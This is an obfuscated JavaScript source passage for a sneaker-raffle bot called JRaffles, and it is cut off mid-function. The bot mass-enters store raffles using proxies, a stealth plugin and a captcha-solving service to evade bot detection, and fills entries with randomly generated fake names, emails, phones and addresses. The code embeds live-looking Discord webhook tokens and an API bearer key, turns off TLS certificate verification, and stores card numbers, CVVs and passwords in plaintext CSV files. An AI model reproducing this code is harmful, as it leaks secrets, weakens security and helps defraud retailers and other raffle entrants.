process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
var _0x40f5d4 = require('node-imap'), _0x463531 = require('util')['inspect'];
const _0xc3daf = require('mailparser')['simpleParser'], { EmbedBuilder: _0x2b6a9d } = require('discord.js');
var _0x460daf = require('exe');
const { execFile: _0x3d6587 } = require('child_process'), _0x3cc012 = require('puppeteer-extra'), _0x4cda3c = require('puppeteer-extra-plugin-recaptcha'), _0x28795e = require('puppeteer-extra-plugin-stealth'), _0x195a86 = require('chalk'), _0x3d4687 = require('node-bash-title'), _0x5b0582 = require('fs'), _0xdd74b5 = require('axios'), _0x2f49f0 = require('papaparse');
var _0x4cd1cc = require('random-name');
const _0x5eed11 = require('request');
var _0x3264a0 = require('prompt');
const _0x26b5a0 = _0x5eed11['jar']();
var _0x5f2d88 = {};
const _0xc45350 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x2175cb = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x2c675c = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x19e029 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x1911a9 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x1df402 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x306979 = 'https://discord.com/api/webhooks/', _0x14158e = '' + _0x306979 + _0x2c675c, _0x4f0ddd = '' + _0x306979 + _0x19e029, _0x39f3e1 = '' + _0x306979 + _0xc45350, _0xb4796a = '' + _0x306979 + _0x2175cb, _0x3f4ede = '' + _0x306979 + _0x1911a9, _0xe4ca4b = '' + _0x306979 + _0x1df402;
const _0x1e655f = JSON['parse'](_0x5b0582['readFileSync']('../package.json', 'utf-8')), _0xca8e52 = _0x1e655f['version'];
var _0x467f9e, _0x175e57, _0x5da0a9, _0x4197bf, _0x2cdbb4, _0x5bd85a, _0x3ab3dd, _0x40b4c7;
const _0x254462 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x355e77 = ![];
const _0x2caa77 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0xafb0d5 = '0123456789';
var _0x267439 = _0x2caa77['split']('');
const _0x328c9f = require('auto-git-update'), { PageEmittedEvents: _0x18f1d2 } = require('puppeteer'), { getRandomValues: _0x221aab } = require('crypto'), { resolve: _0x40fcd4 } = require('path'), { Console: _0x3e07ac } = require('console'), _0x203b04 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x36aa4d = new _0x328c9f(_0x203b04);
async function _0x115465() {
    _0x2cdbb4 = _0x5b0582['readdirSync']('../proxies'), _0x4197bf = _0x5b0582['readdirSync']('../tasks'), !_0x5b0582['existsSync']('../accounts/fenom.csv') && _0x5b0582['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x5b0582['existsSync']('../accounts/bstn.csv') && _0x5b0582['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x5b0582['existsSync']('../failed-tasks.csv') && _0x5b0582['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x5b0582['existsSync']('../successful-tasks.csv') && _0x5b0582['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x5f2d88 = JSON['parse'](_0x5b0582['readFileSync']('../settings.json', 'utf-8')), !_0x5f2d88['delay'] && (_0x5f2d88['delay'] = 0x3c, _0x5b0582['writeFileSync']('../settings.json', JSON['stringify'](_0x5f2d88, null, 0x2))), !_0x5f2d88['masterMail'] && (_0x5f2d88['masterMail'] = 'yourmail@gmail.com', _0x5b0582['writeFileSync']('../settings.json', JSON['stringify'](_0x5f2d88, null, 0x2))), !_0x5f2d88['masterPassword'] && (_0x5f2d88['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x5b0582['writeFileSync']('../settings.json', JSON['stringify'](_0x5f2d88, null, 0x2))), !_0x5f2d88['captchaKey'] && (_0x5f2d88['captchaKey'] = '', _0x5b0582['writeFileSync']('../settings.json', JSON['stringify'](_0x5f2d88, null, 0x2))), !_0x5f2d88['useRandomProxy'] && (_0x5f2d88['useRandomProxy'] = !![], _0x5b0582['writeFileSync']('../settings.json', JSON['stringify'](_0x5f2d88, null, 0x2))), !_0x5f2d88['webhook'] && (_0x5f2d88['webhook'] = '', _0x5b0582['writeFileSync']('../settings.json', JSON['stringify'](_0x5f2d88, null, 0x2))), _0x5f2d88['delay'] <= 0x1388 && (_0x5f2d88['delay'] = _0x5f2d88['delay'] * 0x3e8), _0x5f2d88['MahaDelay'] = _0x5f2d88['delay'], _0x306979 = _0x5f2d88['webhook'], _0x5bd85a = _0x5f2d88['licenseKey'];
}
let _0x1cbc4b, _0x2ae7b4 = [], _0x3ed652;
const _0x506d6f = _0x29698e => new Promise(_0x2a346c => setTimeout(_0x2a346c, _0x29698e));
function _0x31107f(_0x1b3b99, _0x4825e) {
    return Math['floor'](Math['random']() * (_0x4825e - _0x1b3b99 + 0x1) + _0x1b3b99);
}
async function _0x199336(_0xd64298) {
    return _0xdd74b5['get']('https://api.hyper.co/v4/licenses/' + _0xd64298, { 'headers': { 'Authorization': 'Bearer\x20' + _0x254462 } })['then'](_0x4a2c38 => _0x4a2c38['data'])['catch'](() => null);
}
;
async function _0x3b4c02(_0x3eff83) {
    console['clear']();
    if (_0x3eff83 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x54d37d = await _0x3264a0['get']('License');
        if (_0x54d37d['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x506d6f(0xbb8), _0x3b4c02(_0x3eff83);
        _0x3eff83 = _0x54d37d['License'], _0x5f2d88['licenseKey'] = _0x3eff83, _0x5bd85a = _0x3eff83, _0x5b0582['writeFileSync']('../settings.json', JSON['stringify'](_0x5f2d88));
    }
    console['log']('Checking\x20license\x20' + _0x5bd85a + '...'), await _0x506d6f(0x320);
    const _0xec97f1 = await _0x199336(_0x3eff83);
    _0x3ab3dd = JSON['stringify'](_0xec97f1['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x40b4c7 = JSON['stringify'](_0xec97f1['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0xec97f1)
        return console['log']('License\x20not\x20found');
    if (!_0xec97f1['user'])
        return console['log']('License\x20not\x20bound');
    return _0xec97f1['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x355e77 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x355e77 = ![]);
}
async function _0x2c3ef7() {
    var _0x1edf18 = await _0x3264a0['get']('Module');
    return console['clear'](), _0x1edf18['Module'];
}
;
async function _0x5a1f0c() {
    var _0x2786a2 = await _0x3264a0['get']('Setting');
    return console['clear'](), _0x2786a2['Setting'];
}
async function _0x49529d() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x34d55b = 0x0; _0x34d55b < _0x4197bf['length']; _0x34d55b++) {
        console['log']('\x20(' + _0x34d55b + ')\x20' + _0x4197bf[_0x34d55b]);
    }
    console['log']('');
    var _0x113886 = await _0x3264a0['get']('Task');
    if (_0x113886['Task'] > _0x4197bf['length'] - 0x1 || isNaN(_0x113886['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x506d6f(0x3e8), _0x49529d();
    var _0x3c9427 = _0x5b0582['readFileSync']('../tasks/' + _0x4197bf[_0x113886['Task']], 'utf-8');
    return _0x5da0a9 = _0x2f49f0['parse'](_0x3c9427, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x195a86['blue'](_0x4197bf[_0x113886['Task']])), _0x467f9e = _0x4197bf[_0x113886['Task']], _0x5da0a9;
}
async function _0x46afed() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x401593 = 0x0; _0x401593 < _0x2cdbb4['length']; _0x401593++) {
        console['log']('\x20(' + _0x401593 + ')\x20' + _0x2cdbb4[_0x401593]);
    }
    console['log']('');
    var _0x58a025 = await _0x3264a0['get']('Proxies');
    if (_0x58a025['Proxies'] > _0x2cdbb4['length'] - 0x1 || isNaN(_0x58a025['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x506d6f(0x3e8), _0x46afed();
    var _0x4ef84d = _0x5b0582['readFileSync']('../proxies/' + _0x2cdbb4[_0x58a025['Proxies']], 'utf-8')['split']('\x0a');
    let _0x30c6f6 = _0x4ef84d['map']((_0x1aad27, _0x52c838) => {
        sanatizeProxy = _0x1aad27['replace']('\x0d', '');
        if (_0x4ef84d[_0x52c838 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x175e57 = _0x2cdbb4[_0x58a025['Proxies']], console['clear'](), _0x30c6f6;
}
async function _0x145a76() {
    var _0x40902b = await _0x3264a0['get']('Value');
    return console['clear'](), _0x40902b['Value'];
}
async function _0x6575b1(_0x39bb2d) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x4512b0 = 0x0; _0x4512b0 < _0x39bb2d['length']; _0x4512b0++) {
        console['log']('\x20(' + _0x4512b0 + ')\x20[' + _0x39bb2d[_0x4512b0]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x511f25 = await _0x3264a0['get']('Module');
    return _0x511f25['Module'];
}
async function _0x2f4a2c() {
    var _0xf6fe27 = await _0x3264a0['get']('Password');
    return console['clear'](), _0xf6fe27['Password'];
}
;
async function _0x2ada5d() {
    var _0x2af3c8 = await _0x3264a0['get']('Links');
    return _0x2af3c8['Links'];
}
;
async function _0x429043() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0xdce344 = 0x0; _0xdce344 < _0x2ae7b4['length']; _0xdce344++) {
        console['log']('\x20(' + _0xdce344 + ')\x20' + _0x2ae7b4[_0xdce344]);
    }
    ;
    console['log']();
    let _0x3d871a = await _0x3264a0['get']('Product');
    return console['clear'](), _0x3d871a['Product'];
}
;
function _0x15866d() {
    var _0x470a5c = new Date(Date['now']())['toLocaleTimeString']();
    return _0x470a5c;
}
;
function _0x3ec034() {
    var _0x17153b = new Date(Date['now']())['toLocaleString']();
    return _0x17153b['replace'](',', '');
}
async function _0x57bb0c(_0x30f944, _0x2c028c) {
    let _0x368310 = { 'headers': { 'content-type': 'application/json' } };
    if (_0xca8e52 != 'devkey') {
        await _0xdd74b5['post'](_0x30f944, _0x2c028c, _0x368310);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x52a86e(_0x2d62c4, _0x3950ef, _0x34b502, _0x4226f1, _0x4ead21) {
    if (!_0x4226f1 && _0x34b502 == 'dev') {
        var _0x30d84b = new _0x2b6a9d()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x3950ef['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x3950ef['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x2d62c4['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x5f2d88['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x3ab3dd,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x2d62c4['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0xca8e52,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x30d84b['data'];
    } else {
        if (_0x4226f1 && _0x34b502 == 'dev') {
            var _0x30d84b = new _0x2b6a9d()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x3950ef['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x3ab3dd,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x3950ef['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x2d62c4['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x5f2d88['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x4ead21,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x2d62c4['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0xca8e52,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x30d84b['data'];
        } else {
            if (_0x34b502 == 'pub') {
                var _0x30d84b = new _0x2b6a9d()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x3950ef['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x3950ef['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x2d62c4['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x5f2d88['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x2d62c4['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0xca8e52,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x30d84b['data'];
            } else {
                if (_0x34b502 == 'acc' && !_0x4226f1) {
                    var _0x30d84b = new _0x2b6a9d()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x3950ef['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x3ab3dd,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x3950ef['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x5f2d88['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0xca8e52,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x30d84b['data'];
                } else {
                    if (_0x34b502 == 'acc' && _0x4226f1) {
                        var _0x30d84b = new _0x2b6a9d()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x3950ef['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x3ab3dd,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x4ead21,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x3950ef['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x5f2d88['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0xca8e52,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x30d84b['data'];
                    } else {
                        if (_0x34b502 == 'open') {
                            var _0x30d84b = new _0x2b6a9d()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x40b4c7)['addFields']({
                                'name': 'User',
                                'value': '' + _0x3ab3dd,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0xca8e52,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x30d84b['data'];
                        } else {
                            if (!_0x4226f1 && _0x34b502 == 'ver') {
                                var _0x30d84b = new _0x2b6a9d()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x3950ef['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x3ab3dd,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x3950ef['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x5f2d88['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0xca8e52,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x30d84b['data'];
                            } else {
                                if (_0x4226f1 && _0x34b502 == 'ver') {
                                    var _0x30d84b = new _0x2b6a9d()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x3950ef['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x3ab3dd,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x4ead21,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x3950ef['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x5f2d88['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0xca8e52,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x30d84b['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x502cd4(_0x117558, _0x2a5b8d) {
    var _0x52e958 = _0x117558[_0x2a5b8d]['Address1']['split'](''), _0x524896 = _0x117558[_0x2a5b8d]['Address2']['split'](''), _0x3a4a96 = _0x117558[_0x2a5b8d]['Email']['split']('@');
    for (var _0x85b79 = 0x0; _0x85b79 < _0x52e958['length']; _0x85b79++) {
        if (_0x52e958[_0x85b79] == 'X') {
            var _0x568afb = Math['round'](Math['random']() * (_0x2caa77['length'] - 0x1));
            _0x52e958[_0x85b79] = _0x267439[_0x568afb];
        }
    }
    ;
    for (var _0x85b79 = 0x0; _0x85b79 < _0x524896['length']; _0x85b79++) {
        if (_0x524896[_0x85b79] == 'X') {
            var _0x568afb = Math['round'](Math['random']() * (_0x2caa77['length'] - 0x1));
            _0x524896[_0x85b79] = _0x267439[_0x568afb];
        }
    }
    ;
    _0x117558[_0x2a5b8d]['FirstName'] == 'RANDOM' && (_0x117558[_0x2a5b8d]['FirstName'] = _0x4cd1cc['first']());
    _0x117558[_0x2a5b8d]['LastName'] == 'RANDOM' && (_0x117558[_0x2a5b8d]['LastName'] = _0x4cd1cc['last']());
    _0x3a4a96[0x0] == 'RANDOM' ? _0x3a4a96[0x0] = '' + _0x4cd1cc['first']() + _0x4cd1cc['last']() + _0x31107f(0x1, 0x270f) + '@' : _0x3a4a96[0x0] = _0x3a4a96[0x0] + '@';
    _0x117558[_0x2a5b8d]['Email'] = _0x3a4a96['join'](''), _0x117558[_0x2a5b8d]['Address1'] = _0x52e958['join'](''), _0x117558[_0x2a5b8d]['Address2'] = _0x524896['join']('');
    _0x117558[_0x2a5b8d]['Phone'] == 'RANDOM' && (_0x117558[_0x2a5b8d]['Phone'] = '0' + _0x31107f(0x5f5e100, 0x3b9ac9ff));
    if (_0x117558[_0x2a5b8d]['Follower'] == 'RANDOM') {
        var _0x2398de = _0x31107f(0x1, 0x270f);
        _0x117558[_0x2a5b8d]['Follower'] = '' + _0x4cd1cc['first']() + _0x4cd1cc['last']() + _0x2398de + '\x20';
    }
    _0x117558[_0x2a5b8d]['HouseNumber'] == 'RANDOM' && (_0x117558[_0x2a5b8d]['HouseNumber'] = _0x31107f(0x1, 0xc8));
    if (_0x117558[_0x2a5b8d]['Address1'] == 'RANDOM') {
        var _0x4e6692 = Math['round'](Math['random']() * (_0x2caa77['length'] - 0x1)), _0x4866f1 = _0x267439[_0x4e6692];
        _0x117558[_0x2a5b8d]['Address1'] = _0x4cd1cc['last']() + 'straat', _0x117558[_0x2a5b8d]['Zip'] == '' && (_0x117558[_0x2a5b8d]['Postcode'] = _0x31107f(0x3e8, 0x270f) + '\x20' + _0x4866f1 + _0x4866f1, _0x117558[_0x2a5b8d]['Zip'] = _0x117558[_0x2a5b8d]['Postcode']), _0x117558[_0x2a5b8d]['HouseNumber'] = '' + _0x31107f(0x1, 0xc8);
    }
    return;
}
;
async function _0x5c9ba1(_0x131233, _0x11b0ac) {
    _0x5b0582['appendFileSync']('../failed-tasks.csv', _0x3ec034() + ',' + _0x11b0ac['store'] + ',' + _0x11b0ac['name'] + ',' + _0x131233['Url'] + ',' + _0x131233['Size'] + ',' + _0x131233['Follower'] + ',' + _0x131233['FirstName'] + ',' + _0x131233['LastName'] + ',' + _0x131233['Address1'] + ',' + _0x131233['Address2'] + ',' + _0x131233['HouseNumber'] + ',' + _0x131233['Zip'] + ',' + _0x131233['City'] + ',' + _0x131233['State'] + ',' + _0x131233['Country'] + ',' + _0x131233['Phone'] + ',' + _0x131233['Email'] + ',' + _0x131233['Password'] + ',' + _0x131233['PaymentMethod'] + ',' + _0x131233['CardType'] + ',' + _0x131233['NameOnCard'] + ',' + _0x131233['CardNumber'] + ',' + _0x131233['ExpiryDate'] + ',' + _0x131233['CVV'] + ',' + _0x131233['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x37d376(_0x2835f2, _0x4bd98e) {
    _0x5b0582['appendFileSync']('../successful-tasks.csv', _0x3ec034() + ',' + _0x4bd98e['store'] + ',' + _0x4bd98e['name'] + ',' + _0x2835f2['Url'] + ',' + _0x2835f2['Size'] + ',' + _0x2835f2['Follower'] + ',' + _0x2835f2['FirstName'] + ',' + _0x2835f2['LastName'] + ',' + _0x2835f2['Address1'] + ',' + _0x2835f2['Address2'] + ',' + _0x2835f2['HouseNumber'] + ',' + _0x2835f2['Zip'] + ',' + _0x2835f2['City'] + ',' + _0x2835f2['State'] + ',' + _0x2835f2['Country'] + ',' + _0x2835f2['Phone'] + ',' + _0x2835f2['Email'] + ',' + _0x2835f2['Password'] + ',' + _0x2835f2['PaymentMethod'] + ',' + _0x2835f2['CardType'] + ',' + _0x2835f2['NameOnCard'] + ',' + _0x2835f2['CardNumber'] + ',' + _0x2835f2['ExpiryDate'] + ',' + _0x2835f2['CVV'] + ',' + _0x2835f2['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x31f1cc() {
    let _0x4dfc56 = proxyFile['split']('\x0a'), _0x2626f3 = _0x4dfc56['map']((_0x2db71a, _0x5be8f0) => {
        sanatizeProxy = _0x2db71a['replace']('\x0d', '');
        if (_0x4dfc56[_0x5be8f0 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x2626f3;
}
;
async function _0xe71a0e(_0x4ecedb) {
    var _0x254909 = _0x4ecedb[0x1]['split'](':');
    const _0x10cd98 = await _0x3cc012['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x254909[0x0] + ':' + _0x254909[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x8f4517 = await _0x10cd98['newPage']();
        await _0x8f4517['authenticate']({
            'username': '' + _0x254909[0x2],
            'password': '' + _0x254909[0x3]
        }), console['log'](_0x15866d() + '\x20[' + _0xd1bb45[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x8f4517['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x8f4517['setRequestInterception'](!![]), _0x8f4517['on']('request', _0x1208f7 => {
            _0x1208f7['resourceType']() === 'image' || _0x1208f7['resourceType']() === 'font' || _0x1208f7['resourceType']() === 'media' ? _0x1208f7['abort']() : _0x1208f7['continue']();
        }), await _0x8f4517['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x15866d() + '\x20[' + _0xd1bb45[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x8f4517['waitForTimeout'](0xbb8), await _0x8f4517['waitForSelector']('.product-card');
        const _0x4d81e4 = await _0x8f4517['$$eval']('a.product-card', _0x1e85fe => {
            return _0x1e85fe['map'](_0x1fa8ac => _0x1fa8ac['href']);
        });
        return _0x2ae7b4 = _0x4d81e4;
    } catch (_0x2bf118) {
        console['log']('\x20' + _0x2bf118);
    } finally {
        _0x10cd98['close'](), console['clear']();
    }
}
;
async function _0x5085f3(_0x152a20, _0x568870) {
    _0x3cc012['use'](_0x28795e()), _0x3cc012['use'](_0x4cda3c({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5f2d88['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x3f8b74 = 0x0; _0x3f8b74 < bouncewear['length']; _0x3f8b74++) {
        await _0x502cd4(bouncewear, _0x3f8b74);
        if (bouncewear[_0x3f8b74]['Email'] == '' || bouncewear[_0x3f8b74]['Password'] == '' || bouncewear[_0x3f8b74]['FirstName'] == '' || bouncewear[_0x3f8b74]['LastName'] == '') {
            console['log'](_0x15866d() + '\x20[' + _0xd1bb45[taskModule]['name'] + ']\x20Task\x20' + (_0x3f8b74 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x5f2d88['useRandomProxy'] = ![])
            var _0x4712d2 = _0x31f1cc()[_0x3f8b74]['split'](':');
        else
            var _0x1ddc5e = Math['round'](Math['random']() * (_0x31f1cc()['length'] - 0x1)), _0x4712d2 = _0x31f1cc()[_0x1ddc5e]['split'](':');
        const _0x14df24 = await _0x3cc012['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x4712d2[0x0] + ':' + _0x4712d2[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x49a141 = await _0x14df24['newPage']();
            await _0x49a141['authenticate']({
                'username': '' + _0x4712d2[0x2],
                'password': '' + _0x4712d2[0x3]
            }), console['log'](_0x15866d() + '\x20[' + _0x568870['name'] + ']\x20Task\x20' + (_0x3f8b74 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x49a141['setRequestInterception'](!![]), _0x49a141['on']('request', _0x4ab07f => {
                _0x4ab07f['resourceType']() === 'image' || _0x4ab07f['resourceType']() === 'font' || _0x4ab07f['resourceType']() === 'media' ? _0x4ab07f['abort']() : _0x4ab07f['continue']();
